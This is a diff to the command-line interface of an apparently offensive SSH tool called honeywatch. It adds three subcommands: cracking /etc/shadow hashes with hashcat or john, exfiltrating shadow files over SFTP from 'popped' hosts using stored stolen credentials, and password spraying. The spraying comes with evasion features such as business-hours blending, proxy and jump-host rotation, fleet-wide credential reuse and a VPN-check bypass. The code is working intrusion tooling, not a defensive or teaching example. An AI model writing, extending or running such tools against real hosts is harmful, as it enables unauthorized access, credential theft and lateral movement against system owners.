@@ -20,6 +20,8 @@ import sys
 import time
 from collections import Counter
 
+from honeywatch.cmd_spray import _cmd_spray
+
 __all__ = ["build_parser", "main"]
 
 
@@ -550,6 +552,104 @@ def build_parser() -> argparse.ArgumentParser:
     p_creds.add_argument("--db", default=None, help="SQLite database path")
     p_creds.add_argument("--config", default=None, help="path to a honeywatch TOML config")
     p_creds.set_defaults(func=_cmd_creds)
+
+    # ----------------------------- hashcrack -----------------------------
+    p_hash = sub.add_parser(
+        "hashcrack",
+        help="offline hash cracking of /etc/shadow with hashcat or john",
+    )
+    p_hash.add_argument("shadow", help="path to an /etc/shadow file (or a stash dir)")
+    p_hash.add_argument("--passwd", default=None, help="optional /etc/passwd companion file")
+    p_hash.add_argument("--wordlist", required=True, help="password wordlist for the attack")
+    p_hash.add_argument(
+        "--tool", choices=("hashcat", "john"), default="hashcat",
+        help="cracker binary (default hashcat)"
+    )
+    p_hash.add_argument("--bin", default=None, help="path to the hashcat/john binary")
+    p_hash.add_argument("--mode", type=int, default=None, help="hashcat -m mode override")
+    p_hash.add_argument(
+        "--extra-args", default=None,
+        help="extra args passed through to the cracker (shell-split)"
+    )
+    p_hash.add_argument("--timeout", type=float, default=None, help="seconds to bound the cracker run")
+    p_hash.add_argument(
+        "--ip", default=None,
+        help="record cracked passwords against this host ip in the store"
+    )
+    p_hash.add_argument("--port", type=int, default=22, help="host port when recording creds")
+    p_hash.add_argument("--no-save", action="store_true", help="do not persist cracked passwords to the store")
+    p_hash.add_argument("--json", action="store_true", help="emit results as a JSON object")
+    p_hash.add_argument("--db", default=None, help="SQLite database path")
+    p_hash.add_argument("--config", default=None, help="path to a honeywatch TOML config")
+    p_hash.set_defaults(func=_cmd_hashcrack)
+
+    # ------------------------------- grab --------------------------------
+    p_grab = sub.add_parser(
+        "grab",
+        help="SFTP-exfil /etc/shadow from a popped host using cracked creds",
+    )
+    p_grab.add_argument("host", metavar="ip[:port]", help="host to exfil from")
+    p_grab.add_argument("--user", default=None, help="SSH user (default: from credentials store)")
+    p_grab.add_argument("--pass", dest="pass_", default=None, help="SSH password (default: from store)")
+    p_grab.add_argument("--key", default=None, help="SSH private key path (overrides password)")
+    p_grab.add_argument("--stash", default=None, help="local stash dir (default .honeywatch/shadow_stash)")
+    p_grab.add_argument("--timeout", type=float, default=None, help="seconds for the SSH connect")
+    p_grab.add_argument("--json", action="store_true", help="emit results as a JSON object")
+    p_grab.add_argument("--db", default=None, help="SQLite database path")
+    p_grab.add_argument(
+        "--skip-vpn-check", action="store_true", help="bypass the Mullvad VPN gate"
+    )
+    p_grab.add_argument("--config", default=None, help="path to a honeywatch TOML config")
+    p_grab.set_defaults(func=_cmd_grab)
+
+    # ------------------------------ spray -------------------------------
+    p_spray = sub.add_parser(
+        "spray",
+        help="lockout-aware password spraying (one password across many users)",
+    )
+    p_spray.add_argument("targets", nargs="*", metavar="HOST", help="ip[:port] hosts to spray")
+    p_spray.add_argument("--target-file", default=None, help="file with ip[:port] lines")
+    p_spray.add_argument(
+        "--target-label", default=None,
+        choices=("real", "likely_real", "uncertain", "likely_honeypot", "honeypot"),
+        help="pull hosts from the store by final label",
+    )
+    p_spray.add_argument("--min-confidence", type=float, default=None)
+    p_spray.add_argument("--limit", type=int, default=None)
+    p_spray.add_argument("--users", default=None, help="comma-separated usernames to spray")
+    p_spray.add_argument("--user-file", default=None, help="file with usernames (one per line)")
+    p_spray.add_argument(
+        "--passwords", default=None,
+        help="comma-separated passwords to spray (one round each, lockout-safe)",
+    )
+    p_spray.add_argument("--password-file", default=None, help="file with passwords (one per line)")
+    p_spray.add_argument(
+        "--reuse-creds", action="store_true",
+        help="spray every credential already in the store across every discovered host (fleet reuse)",
+    )
+    p_spray.add_argument("--delay", type=float, default=0.0, help="seconds between guesses per host (default 0)")
+    p_spray.add_argument("--jitter", type=float, default=0.5, help="random extra delay up to this many seconds (default 0.5)")
+    p_spray.add_argument(
+        "--lockout-delay", type=float, default=0.0,
+        help="extra delay when a guess looks like a lockout/ban",
+    )
+    p_spray.add_argument(
+        "--business-hours", action="store_true",
+        help="only spray inside 08:00-18:00 local (blend with organic logins)",
+    )
+    p_spray.add_argument(
+        "--no-precheck", action="store_true",
+        help="skip the auth-method precheck (spray even publickey-only hosts)",
+    )
+    p_spray.add_argument("--proxy-file", default=None, help="file of socks5://[user:pass@]host:port proxies to round-robin")
+    p_spray.add_argument("--jump-file", default=None, help="file of user@host SSH jumps to round-robin")
+    p_spray.add_argument("--host-concurrency", type=int, default=8, help="hosts sprayed in parallel (default 8)")
+    p_spray.add_argument("--no-save", action="store_true", help="do not persist recovered creds")
+    p_spray.add_argument("--json", action="store_true", help="emit results as a JSON array")
+    p_spray.add_argument("--db", default=None, help="SQLite database path")
+    p_spray.add_argument("--skip-vpn-check", action="store_true", help="bypass the Mullvad VPN gate")
+    p_spray.add_argument("--config", default=None, help="path to a honeywatch TOML config")
+    p_spray.set_defaults(func=_cmd_spray)
 
     return parser
 
@@ -1449,6 +1549,135 @@ def _cmd_creds(args, argv) -> int:
         print("{:<28} {:<14} {:<24} {:<9} {}".format(
             host, r.get("user") or "", r.get("password") or "",
             r.get("attempts", 0), r.get("discovered_at") or ""))
+    return 0
+
+
+def _cmd_hashcrack(args, argv) -> int:
+    import json as _json
+    import shlex as _shlex
+
+    from honeywatch.config import load_config
+    from honeywatch.hashcrack import crack_shadow, parse_shadow
+    from honeywatch.store import Store
+
+    cfg = load_config(args.config)
+    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
+
+    shadow_path = args.shadow
+    # Allow pointing at a stash dir produced by `grab` (./<ip>/shadow).
+    if os.path.isdir(shadow_path):
+        sub = os.path.join(shadow_path, "shadow")
+        if os.path.isfile(sub):
+            shadow_path = sub
+    if not os.path.isfile(shadow_path):
+        print("hashcrack: shadow file not found: " + args.shadow)
+        return 1
+
+    extra = []
+    if args.extra_args:
+        try:
+            extra = _shlex.split(args.extra_args)
+        except ValueError as exc:
+            print("hashcrack: bad --extra-args: " + str(exc), file=sys.stderr)
+            return 1
+
+    result = crack_shadow(
+        shadow_path=shadow_path,
+        wordlist=args.wordlist,
+        tool=args.tool,
+        passwd_path=args.passwd,
+        bin_path=args.bin,
+        mode=args.mode,
+        extra_args=extra or None,
+        timeout_s=args.timeout,
+    )
+
+    if result.error and not result.cracked:
+        print("hashcrack: " + result.error, file=sys.stderr)
+        if args.json:
+            print(_json.dumps({"error": result.error, "tool": result.tool}, indent=2))
+        return 1
+
+    creds = result.credentials()
+
+    # Persist recovered passwords to the store so deploy / pivot can reuse
+    # them. --ip ties the credential to a host; without it we record with the
+    # shadow filename as a source tag so an operator can still query by user.
+    if creds and not args.no_save:
+        store = Store(db_path)
+        for c in creds:
+            ip = args.ip or ""
+            if ip:
+                store.upsert_credential(
+                    ip, args.port, c["user"], c["password"],
+                    banner=None, attempts=1, source="hashcat" if args.tool == "hashcat" else "john",
+                )
+
+    if args.json:
+        print(_json.dumps({
+            "tool": result.tool,
+            "wordlist": result.wordlist,
+            "attempted": result.attempted,
+            "cracked": len(creds),
+            "error": result.error,
+            "returncode": result.returncode,
+            "credentials": creds,
+        }, indent=2, default=str))
+        return 0
+
+    print("hashcrack summary (" + result.tool + ")")
+    print("  attempted:  " + str(result.attempted))
+    print("  cracked:   " + str(len(creds)))
+    if result.error:
+        print("  error:     " + result.error)
+    if creds:
+        print("\ncredentials:")
+        for c in creds:
+            print("  " + str(c["user"]) + ":" + str(c["password"]))
+    return 0
+
+
+def _cmd_grab(args, argv) -> int:
+    import json as _json
+
+    from honeywatch.config import load_config
+    from honeywatch.hashcrack import grab_shadow
+    from honeywatch.store import Store
+
+    cfg = load_config(args.config)
+    if not _enforce_vpn(cfg, args.skip_vpn_check):
+        return 2
+
+    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
+    ip, port = parse_host(args.host)
+    user = args.user
+    passw = args.pass_
+
+    # Auto-fill from the credentials store when the operator did not pin creds.
+    if (not user or not passw) and not args.key:
+        cred = Store(db_path).credential_for(ip, port)
+        if cred:
+            user = user or cred.get("user")
+            passw = passw or cred.get("password")
+
+    stash = args.stash or ".honeywatch/shadow_stash"
+    timeout_s = args.timeout if args.timeout is not None else 10.0
+    res = grab_shadow(
+        ip=ip, port=port, user=user, password=passw, key_path=args.key,
+        stash_dir=stash, timeout_s=timeout_s,
+    )
+    if args.json:
+        print(_json.dumps(res, indent=2, default=str))
+        return 0 if res.get("shadow_path") else 1
+    if res.get("error"):
+        print("grab: " + res["error"], file=sys.stderr)
+        return 1
+    print("grabbed shadow for " + ip + ":" + str(port))
+    print("  shadow: " + str(res.get("shadow_path")))
+    if res.get("passwd_path"):
+        print("  passwd: " + str(res.get("passwd_path")))
+    print("  next: honeywatch hashcrack " + str(res.get("shadow_path"))
+          + " --wordlist <wl> --ip " + ip + " --port " + str(port))
     return 0
 
 
